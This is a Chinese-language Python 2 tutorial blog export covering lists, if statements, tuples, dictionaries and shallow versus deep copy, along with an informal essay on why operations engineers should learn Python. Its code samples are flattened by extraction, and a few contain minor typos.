访问列表中的值&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用下标索引来访问列表中的值，同样也可以使用方括号的形式截取字符 1234567#!/usr/bin/pythonlist1 = ['physics', 'chemistry', 1997, 2000];list2 = [1, 2, 3, 4, 5, 6, 7 ];print "list1[0]: ", list1[0]print "list2[1:5]: ", list2[1:5] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实例输出结果 12list[0]: physicslist2[1:5]: [2,3,4,5] 更新列表&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以对列表的数据项进行修改或更新，也可以使用 append() 方法来添加列表项。 123456789#!/usr/bin/pythonlist = ['physics', 'chemistry', 1997, 2000];print "Value available at index 2 : "print list[2];list[2] = 2001;print "New value available at index 2 : "print list[2]; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实例输出结果 1234Value available at index 2 :1997New value available at index 2 :2001 删除列表元素&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以使用 del 语句来删除列表的元素。 12345678#!/usr/bin/pythonlist1 = ['physics', 'chemistry', 1997, 2000];print list1;del list1[2];print "After deleting value at index 2 : "print list1; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实例输出 123['physics', 'chemistry', 1997, 2000]After deleting value at index 2 :['physics', 'chemistry', 2000] Python 列表脚本操作符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列表对 + 和 的操作符与字符串相似。+ 号用于组合列表， 号用于重复列表。 Python表达式 结果 描述 len([1,2,3]) 3 长度 [1,2,3] + [4,5,6] [1,2,3,4,5,6] 组合 [‘Hi!’] * 4 [‘Hi!’,’Hi!’,’Hi!’,’Hi!’] 重复 3 in [1,2,3] true 元素是否存在于列表中 for x in [1,2,3]:print x, 1 2 3 迭代 Python 列表截取&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 的列表截取实例： 12345678&gt;&gt;&gt; L = ['Google', 'Runoob', 'Taobao']&gt;&gt;&gt; L[2]'Taobao'&gt;&gt;&gt; L[-2]'Runoob'&gt;&gt;&gt; L[1:]['Runoob', 'Taobao']&gt;&gt;&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;描述 Python 表达式 结果 描述 L[2] ‘Taobao’ 读取列表中第三个元素 L[-2] ‘Runoob’ 读取列表中倒数第二个元素 L[1:] [‘Runoob’,’Taobao’] 从第儿歌元素开始截取列表 Python 列表函数&amp;方法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 包含以下函数： 序号 函数 1 cmp(list1,list2)%E6%96%B9%E6%B3%95.md),比较两个列表的元素 2 len(list)%E6%96%B9%E6%B3%95.md),列表元素个数 3 max(list)%E6%96%B9%E6%B3%95.md),返回列表元素最大值 4 min(list)%E6%96%B9%E6%B3%95.md),返回列表元素最小值 5 list(seq)%E6%96%B9%E6%B3%95.md),将元组转换为列表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 包含以下方法 序号 方法 1 list.append(obj)%E6%96%B9%E6%B3%95.md),在列表末尾添加新的对象 2 list.count(obj)%E6%96%B9%E6%B3%95.md),统计某个元素在列表中出现的次数 3 list.extend(seq)%E6%96%B9%E6%B3%95.md),在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表） 4 list.index(obj)%E6%96%B9%E6%B3%95.md),从列表中找出某个值第一个匹配项的索引位置 5 list.insert(index, obj)%E6%96%B9%E6%B3%95.md),将对象插入列表 6 list.pop(obj=list[-1])%E6%96%B9%E6%B3%95.md),移除列表中的一个元素（默认最后一个元素），并且返回该元素的值 7 list.remove(obj)%E6%96%B9%E6%B3%95.md),移除列表中某个值的第一个匹配项 8 list.reverse()%E6%96%B9%E6%B3%95.md),反向列表中元素 9 list.sort([func])%E6%96%B9%E6%B3%95.md),对厡列表进行排序]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 流程控制- if 条件语句]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F2.0%202.1%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6-if%E6%9D%A1%E4%BB%B6%2F12.%20Python%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6-if%20%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%2F</url>
    <content type="text"><![CDATA[&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 条件语句是通过一条或多条语句的执行结果（true 或者 false）来决定执行的代码块。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以通过下图来简单了解条件语句的执行过程： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 程序语言指定任何非0或非空（null）值为true，0或者null为false。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 编程中 if 语句用于控制程序的执行，基本形式为： if 语句 1234if expression（判断条件）: statement(s)（执行语句……）else: statement(s)（执行语句……） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：Python 使用缩进作为其语句分组的方法，建议使用4个空格。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中“判断条件”成立时（非零），则执行后面的语句，而执行内容可以多行，以缩进来区分表示统一范围。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;else 为可选语句，放需要在条件不成立时，执行内容则可以执行相关语句： 123456789101112#!/usr/bin/python# -*- coding: UTF-8 -*- # 例1：if 基本用法 flag = Falsename = 'luren'if name == 'python': # 判断变量否为'python' flag = True # 条件成立时设置标志为真 print 'welcome boss' # 并输出欢迎信息else: print name # 条件不成立时输出变量名称 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果为： 1luren #输出结果 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;if 语句的判断条件可以用 &gt;（大于）、&lt;（小于）、==（等于）、&gt;=（大于等于）、&lt;=（小于等于）来表示其关系。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当判断条件为多个值时，可以用以下形式： 12345678if expression1（判断条件1）: statement1(s)（执行语句1……）elif expression2（判断条件2）: statement2(s)（执行语句2……）elif expression3（判断条件3）: statement3(s)（执行语句3……）else: statement(s)（执行语句……） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实例如下： 123456789101112131415#!/usr/bin/python# -*- coding: UTF-8 -*-# 例2：elif用法 num = 5 if num == 3: # 判断num的值 print 'boss' elif num == 2: print 'user'elif num == 1: print 'worker'elif num &lt; 0: # 值小于零时输出 print 'error'else: print 'roadman' # 条件均不成立时输出 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果为： 1roadman #输出结果 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于 python 并不支持 switch 语句，多疑多个条件判断，只能用 elif 来实现，如果判断需要多个条件同时判断时，可以使用 or（或），表示两个条件有一个成立时判断条件成功；使用 and（与）时，表示只有两个条件同时成立的情况下，判断条件才成功。 123456789101112131415161718192021222324#!/usr/bin/python# -*- coding: UTF-8 -*- # 例3：if语句多个条件 num = 9if num &gt;= 0 and num &lt;= 10: # 判断值是否在0~10之间 print 'hello'# 输出结果: hello num = 10if num &lt; 0 or num &gt; 10: # 判断值是否在小于0或大于10 print 'hello'else: print 'undefine'# 输出结果: undefine num = 8# 判断值是否在0~5或者10~15之间if (num &gt;= 0 and num &lt;= 5) or (num &gt;= 10 and num &lt;= 15): print 'hello'else: print 'undefine'# 输出结果: undefine &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当 if 有多个条件时可使用括号来区分判断的先后顺序，括号中的判断优先执行，此外 and 和 or 的优先级低于 &gt;(大于)、&lt;（小于）等判断符号，即大于和小于在没有括号的情况下会比与要优先判断。 简单的语句组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以在同一行的位置上使用 if 条件判断语句： 12345678#!/usr/bin/python # -*- coding: UTF-8 -*- var = 100 if ( var == 100 ) : print "变量 var 的值为100" print "Good bye!" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行输出结果： 12变量 var 的值为 100Good bye！]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 元组]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F1.6%20%E5%85%83%E7%BB%84%2F8.%20Python%20%E5%85%83%E7%BB%84%2F</url>
    <content type="text"><![CDATA[Python 元组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;元组是序列的一种。序列包括字符串、列表和元组。 序列说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;序列的两个主要特点是索引操作符和切片操作符 索引操作符让我们可以从序列中抓取一个特定项目 切片操作符让我们能够获取序列的一个切片，即一部分序列。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;序列的基本操作 len()：求序列的长度 1234In [1]: a = 'abc'In [2]: len(a)Out[2]: 3 +：连接2个序列 12In [3]: a + 'd'Out[3]: 'abcd' *：重复序列元素 12345678In [4]: aOut[4]: 'abc'In [5]: a * 4Out[5]: 'abcabcabcabc'In [8]: '@' * 10Out[8]: '@@@@@@@@@@' in 或 not in：判断元素是否存在序列中 1234567891011In [9]: 'a' in aOut[9]: TrueIn [10]: aOut[10]: 'abc'In [11]: 'd' in aOut[11]: FalseIn [12]: 'd' not in aOut[12]: True max()：返回最大值 12In [13]: max(a)Out[13]: 'c' min()：返回最小值 12In [14]: min(a)Out[14]: 'a' cmp(x,y)：比较两个个序列是否相等 1234567891011121314In [15]: aOut[15]: 'abc'In [16]: cmp(a,'abc')Out[16]: 0In [17]: cmp(a,'abcd')Out[17]: -1In [18]: cmp(a,'ab')Out[18]: 1In [19]: cmp(a+'g','abcdef')Out[19]: 1 元组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 的元组与列表十分相似，不同之处在于元组的元素不能修改。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;元组和字符串一样是不可变的 元组可以存储一系列的值 元组通常用在用户定义的函数能够安全地采用一组值的时候，即被使用的元组的值不回改变 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;元组使用小括号，列表使用方括号。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可。 1234567891011121314In [21]: tup1 = ('python','a',1997,2017);In [22]: type(tup1)Out[22]: tupleIn [23]: tup2 = (1,2,3,4,(5,))In [24]: type(tup2)Out[24]: tupleIn [25]: tup3 = "a","b","c","d";In [26]: type(tup3)Out[26]: tuple &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建空元组 1234In [27]: tup1 = ();In [28]: type(tup1)Out[28]: tuple &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;元组中只包含一个元素时，需要在元素后面添加逗号 1234In [29]: tup1 = (50,);In [30]: type(tup1)Out[30]: tuple &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;元组与字符串类似，下标索引从0开始，可以进行截取，组合等。 访问元组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;元组可以使用下标索引来访问元组中的值 1234567#!/usr/bin/pythontup1 = ('physics', 'chemistry', 1997, 2000);tup2 = (1, 2, 3, 4, 5, 6, 7 );print "tup1[0]: ", tup1[0]print "tup2[1:5]: ", tup2[1:5] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果 12tup1[0]: physicstup2[1:5]: (2, 3, 4, 5) 修改元组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;元组的元素值是不允许修改的，但可以对元组进行连接组合 123456789101112#!/usr/bin/python# -*- coding: UTF-8 -*-tup1 = (12, 34.56);tup2 = ('abc', 'xyz');# 以下修改元组元素操作是非法的。# tup1[0] = 100;# 创建一个新的元组tup3 = tup1 + tup2;print tup3; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果 1(12,34,56,'abc','xyz') 删除元组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;元组中的元素值是不允许删除的，但可以使用 del 语句来删除整个元组 12345678#!/usr/bin/pythontup = ('physics', 'chemistry', 1997, 2000);print tup;del tup;print "After deleting tup : "print tup; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上实例元组被删除后，输出变量会有异常信息，输出如下所示： 123456('physics', 'chemistry', 1997, 2000)After deleting tup :Traceback (most recent call last): File "test.py", line 9, in &lt;module&gt; print tup;NameError: name 'tup' is not defined 元组运算符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;与字符串一样，元组之间可以使用 + 号和 号进行元算。这就意味着它们可以组合和复制，运算后会生成一个新的元组。python表达式|结果|描述—|—|—len((1,2,3))|3|计算元素个数（1，2，3） + （4，5，6）|（1，2，3，4，5，6）|连接(‘Hi!’) 4|(‘Hi!’,’Hi!’,’Hi!’,’Hi!’)|复制3 in (1,2,3)|true|元素是否存在for x in (1,2,3):print x,|1 2 3 |迭代 元组索引、截取&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为元组也是一个序列，所以可以访问元组中的指定位置的元素，也可以截取索引中的一段元素 1L = ('spam','Spam','SPAM!') python表达式 结果 描述 L[2] ‘SPANM!’ 读取第三个元素 L[-2] ‘Spam’ 反向读取；读取倒数第二个元素 L[1:] (‘Spam’,’SPAM!’) 截取元素 无关闭分隔符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;任意无符号的对象，以逗号隔开，默认为元组 12345#!/usr/bin/pythonprint 'abc', -4.24e93, 18+6.6j, 'xyz';x, y = 1, 2;print "Value of x , y : ", x,y; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上实例运行结果： 12abc -4.24e+93 (18+6.6j) xyzValue of x , y : 1 2 元组内置函数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;python元组包含了以下内置函数 序号 方法及描述 1 cmp(tuple1, tuple2)%20cmp()%E6%96%B9%E6%B3%95.md)，比较两个元组元素。 2 len(tuple)%20len()%E6%96%B9%E6%B3%95.md)，计算元组元素个数。 3 max(tuple)%20max()%E6%96%B9%E6%B3%95.md)，返回元组中元素最大值。 4 min(tuple)%20min()%E6%96%B9%E6%B3%95.md)，返回元组中元素最小值。 5 tuple(seq)%20tuple()%E6%96%B9%E6%B3%95.md)，将列表转换为元组。 元组的拆分&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以通过变量去接收元组的值,通常叫做元组的拆分 123456789101112131415In [31]: tup1 = (a,'b','c')In [32]: tup1Out[32]: ('abc', 'b', 'c')In [33]: first,second,third = tup1In [34]: firstOut[34]: 'abc'In [35]: secondOut[35]: 'b'In [36]: thirdOut[36]: 'c']]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 字典练习]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F1.9%20%E5%AD%97%E5%85%B8%E7%BB%83%E4%B9%A0%2F11.%20Python%20%E5%AD%97%E5%85%B8%E7%BB%83%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;做一个小练习，当我们在执行脚本的时候，让我们从键盘上读取输入，然后把这些输入存到字典了，再把这个字典打印出来： 123456789101112[root@localhost ~]# vim 2.py#!/usr/bin/pythoninfo = &#123;&#125;name = raw_input("Please input name:")age = raw_input("Please input age:")gender = raw_input('Please input (M/F):')info['name'] = nameinfo['age'] = ageinfo['gender'] = genderprint info &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以写成 123456789101112#!/usr/bin/pythoninfo = &#123;&#125;name = raw_input("Please input name:")age = raw_input("Please input age:")gender = raw_input('Please input (M/F):')info['name'] = nameinfo['age'] = ageinfo['gender'] = genderfor k,v in info.items(): print "%s: %s" % (k,v)print 'hello']]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么要学 Python]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F1.1%20%E4%B8%BA%E4%BB%80%E4%B9%88%E5%AD%A6%E4%B9%A0%20Python%2F1.%20%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%AD%A6%20Python%2F</url>
    <content type="text"><![CDATA[为什么要学 Python&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现阶段，掌握一门开发语言已经成为高级运维工程师的必备计能，不会开发，你就不能充分理解你们系统的业务流程，你就不能帮助调试、优化开发人开发的程序，开发人员有的时候很少关注性能的问题，这些问题就得运维人员来做，一个业务上线了，导致CPU使用过高，内存占用过大，如果你不会开发，你可能只能查到进程级别，也就是哪个进程占用这么多，然后呢？然后就交给开发人员处理了，这样咋体现你的价值？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，大一点的公司，服务器都上几百，上千，甚至数万台，这种情况下怎样做自动化运维？用Shell写脚本for循环？呵呵，歇了吧，Shell也就适合简单的系统管理工作。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到复杂的自动化任务还得要用专门的开发语言。你可能说了，自动化管理有专门的开源软件监控也有，直接拿来用下就好了，但是现有的开源软件如Puppet、Saltstack、 OpenStack、Zabbix、Nagios 等多为通用的软件，不可能完全适用你公司的所有需求，当你需要做定制、做二次开发的时候，你咋办？找开发部门？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;开发部门不懂运维的实际业务逻辑，写出来的东西太烂不能用，我自己也做运维系统，6年运维工作经验，开发出来的第一版照样烂的不行，这还是懂的运维业务逻辑的，让开发人员来做，跑偏可能更多了，这就是为什么我见过很多公司自行开发运维平台，最后都扔那了。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其次，不会运维开发，你就不能自己写运维平台复杂的运维工具，一切要借助于找一些开源软件拼拼凑凑，如果是这样，那就请不要抱怨你的工资低，你的工作不受重视了，话说人家FaceBook一个运维工程师管2万台机器，运维工程师年薪十几万USD，你以为人家是盖的呢？哪个不是身怀绝技，开发运维兼备？ 为什么要学Python？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python第一是个非常牛B的脚本语言，能满足绝大部分自动化运维的需求，又能做后端C/S架构，又能用WEB框架快速开发出高大上的Web界面，只有当你自已有能力做出一套运维自动化系统的时候，你的价值才体现出来，你才有资格跟老板谈重视，否则，还是老老实实回去装机器吧。 运维开发为什么要用Python？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Good question, 为什么不用PHP，JAVA， C++，RUBY，这里我只能说，见人见智， 如果你碰巧已经掌握了除Python之外的其它语言，那你爱用啥用啥，如果你是一个连SHELL都还没写明白的新手，想学个语言的话，请用Python，为什么呢？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，PHP是跟Python比的最多的，其实他俩根本就不用比，为什么呢？两个语言适用性不同，PHP主要适用于Web开发，可以迅速的做出中小型，轻量级的WEB网站，但后端嘛，基本还是要借助其它语言，借助什么语言呢？Shell？Python？呵呵。而Python呢，是个综合语言，前后端都可以，单拿出来比Web，也一点不比PHP差，但为什么Web方向上 PHP比Python要火？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先入为主嘛，PHP 90年代诞生就是做Web的，Python2000年后才出现Web框架，但论优秀程度上，Python的Web框架基本上出其无左，至少是跟PHP比。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那JAVA呢？好吧，一个臃肿、中庸、豪无新意的语言，还是老老实实用它来做ERP吧，搞个运维小平台，用JAVA真心没啥必要，在我看来，JAVA就是稳定的中年男人，稳定、成熟、秃顶，而Python代表的就是青春，简洁、快、干净、帅！&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;C++/C，这个嘛，我只能说，如果你会了Python,又会C的话，那你会更吃香，但是不会C的话，其实也无大碍，基本上做运维的人，搞搞C就是为了来装B的，因为多数情况下你都到不了看系统底层源码的程度， 不过如果你学好了Python之后，还是建议你学习下 C++，毕竟相比Python这个动态语言来讲，C++的效率还是高很多的，但对新手来讲，不建议做为第一门语言开始学习，为什么呢？打击自信心…呵呵，你懂的&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Ruby，小日本开发的，还不错，风格跟Python有点像，因为Ruby onrails出了名，国外用的比较多，国内，放心吧，没戏，Python已经把它的想象空间都占死了。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然还有新的语言GO，有些搞运维的看见做开发的人员搞GO，也想凑热闹，觉得是未来，我想说，别瞎没事跟风，GO再成功，也不会变成运维开发语言。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有些人觉得Python效率底，说他不能支持多线程，OH，好吧，这个还有点说对了，但是我想问，看我这篇文章的有几个做过搜索引擎开发？有几个做个上亿PV的并发网站开发？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有几个看过LINUX内核源码？如果没有，请别瞎跟着传了，知道PYTHON为什么不支持多线程吗？这句话问错了，其实Python支持多线程，只是不支持多CPU多线程，也就是一个程序spawn出来的多线程只能占用一个CPU，但是为什么呢？噢，因为GIL，GIL是什么东东，请自行补脑。。。但是你非得用多线程吗？你可以用多进程呀，再牛B你还可以用协程呀，这些Python支持的都很好呀，如果你的程序逻辑不好，搞个多线程也快不起来。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我认识一个博士讲过一句话，我觉得不错，他说，程序效率高低，80%都是写程序的人决定了，语言本身就占20%，所以下次有人再说PYTHON效率低的时候，请让他先回去自己检查下自己的程序多了多少无用的逻辑、循环等等。这个博士自己用Python写的WEB程序，一台服务器每天能处理上亿请求，一秒并发近两万，什么WEB框架这么牛B？ 别问它是谁，它叫tornado。 Python能否自学？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然可以，什么都可以自学，前提是你得能学得会，见过N多菜鸟踏上上自学的不归路，他妈的什么都能自学的话，还用大学干什么？自己在家鳖不就行了？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;动不动就说Python是个脚本语言，自己看看就不会了，说这话的只可能有两种人，一种是高手，一种是SB，对于高手来讲，他肯定已经会其它语言，Python在这种情况下，自学当然就很容易学会，几年前我刚接触Python时，代码遇到问题，找了个开发的哥们帮调试，哥们帮调了十几分钟就搞定了，结果人家以前一句Python代码也没写过，为什 么，因为语言都有相通之处，一门掌握好了，其它门自己学学就会了。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但对于新手来讲，没任何语言基础就开始自学，那么恭喜你，菜鸟们见此文章为证，从今天开始自学，一年后，你要是能自己做出个软件来，来找我要一千块钱。哈哈，真的。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基本上自学是属于专业人员干的事情，就像会一门乐器了，自己学下就可能学会另一门，但我之前没音乐基础，跟着老师都没把吉它学会。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以奉劝没基础又想学Python的同学，花点钱去报个班学吧，拿钱换时间，时间是生命，钱没了可再挣钱，时间过去了就再也不会回来，如果你不信邪，非要自己学，那我 佩服你的勇气，不过自己试试就知道了。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然天下没有绝对的事情，我大天朝牛X的人多了去了，很多人也能过自学编程，最后变成高手了，我的Python也是自学的，但是我可以说自学过程中走过了N多坑好么，好多时候纠结在一个简单的小问题上好几天都卡住，当时如果不是因为工作需求，估计早放弃了，这还是Python，就别说其它复杂的语言了，我相信除了少数的大牛之外，多数 人不比我聪明到哪去，选择自学的同鞋们，一路珍重。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说了这么多，只想告诉那些迷茫不知所措该学什么语言的新手们， 在你还没学好走路的时候，不要老想着，将来我当上老板了，我是开宝马呢？还是开奔驰呢？先学会骑自行车吧！]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 直接赋值、浅拷贝和深度拷贝解析]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F1.8%20%E5%AD%97%E5%85%B8%2F%E6%89%A9%E5%B1%95%2FPython%20%E7%9B%B4%E6%8E%A5%E8%B5%8B%E5%80%BC%E3%80%81%E6%B5%85%E6%8B%B7%E8%B4%9D%E5%92%8C%E6%B7%B1%E5%BA%A6%E6%8B%B7%E8%B4%9D%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Python 直接赋值、浅拷贝和深度拷贝解析 直接赋值：其实就是对象的引用（别名）。 浅拷贝(copy)：拷贝父对象，不会拷贝对象的内部的子对象。 深拷贝(deepcopy)： copy 模块的 deepcopy 方法，完全拷贝了父对象及其子对象。 字典浅拷贝实例1234567&gt;&gt;&gt;a = &#123;1: [1,2,3]&#125;&gt;&gt;&gt; b = a.copy()&gt;&gt;&gt; a, b(&#123;1: [1, 2, 3]&#125;, &#123;1: [1, 2, 3]&#125;)&gt;&gt;&gt; a[1].append(4)&gt;&gt;&gt; a, b(&#123;1: [1, 2, 3, 4]&#125;, &#123;1: [1, 2, 3, 4]&#125;) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;深度拷贝需要引入 copy 模块： 1234567&gt;&gt;&gt;import copy&gt;&gt;&gt; c = copy.deepcopy(a)&gt;&gt;&gt; a, c(&#123;1: [1, 2, 3, 4]&#125;, &#123;1: [1, 2, 3, 4]&#125;)&gt;&gt;&gt; a[1].append(5)&gt;&gt;&gt; a, c(&#123;1: [1, 2, 3, 4, 5]&#125;, &#123;1: [1, 2, 3, 4]&#125;) 解析&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1、b = a : 赋值引用，a 和 b 都指向同一个对象。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2、b = a.copy() : 浅拷贝, a 和 b 是一个独立的对象，但他们的子对象还是指向统一对象（是引用）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;b = copy.deepcopy(a) : 深度拷贝, a 和 b 完全拷贝了父对象及其子对象，两者是完全独立的。 更多实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下实例是使用 copy 模块的 copy.copy（ 浅拷贝 ）和（copy.deepcopy ）: 1234567891011121314151617#!/usr/bin/python# -*-coding:utf-8 -*- import copya = [1, 2, 3, 4, ['a', 'b']] #原始对象 b = a #赋值，传对象的引用c = copy.copy(a) #对象拷贝，浅拷贝d = copy.deepcopy(a) #对象拷贝，深拷贝 a.append(5) #修改对象aa[4].append('c') #修改对象a中的['a', 'b']数组对象 print( 'a = ', a )print( 'b = ', b )print( 'c = ', c )print( 'd = ', d ) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上实例执行输出结果为： 1234('a = ', [1, 2, 3, 4, ['a', 'b', 'c'], 5])('b = ', [1, 2, 3, 4, ['a', 'b', 'c'], 5])('c = ', [1, 2, 3, 4, ['a', 'b', 'c']])('d = ', [1, 2, 3, 4, ['a', 'b']])]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 字典（Dictionary）]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F1.8%20%E5%AD%97%E5%85%B8%2F10.%20Python%20%E5%AD%97%E5%85%B8%EF%BC%88Dictionary%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Python 字典&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;字典是另一种可变容器模型，切可存储任意类型对象。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;字典是 Python 中唯一的映射类型（哈希表） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;字段对象是可变的，但是字典的键必须使用 可变对象 ，一个字典中可以使用不同类型的键值。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;字典的每个键值（key=&gt;value）对用冒号(:)分割，每个对之间用逗号(,)分割，整个字典包括在花括号({})中，格式如下所示： 1d = &#123;key1 ： value1,key2 : value2 &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;键必须是唯一的，但值则不必。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;值可以去任何数据类型，但键必须是不可变的，如字符串，数字或元组。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个简单的字典实例： 1dict = &#123;'Alice':'2341', 'Beth': '9102', 'Cecil': '3258'&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可如此创建字典： 12dict1 = &#123; 'abc': 456&#125;;dict2 = &#123; 'abc': 123, 98.6" 37 &#125;; 访问字典里的值&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把相应的键放入熟悉的方括号 123456#/usr/bin/pythondict = &#123;'Name': 'Zara', 'Age': 7, 'Class': 'First'&#125;;print "dict['Name']: ", dict['Name'];print "dict['Age']: ", dict['Age']; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果为： 12dict['Name']: Zaradict['Age']: 7 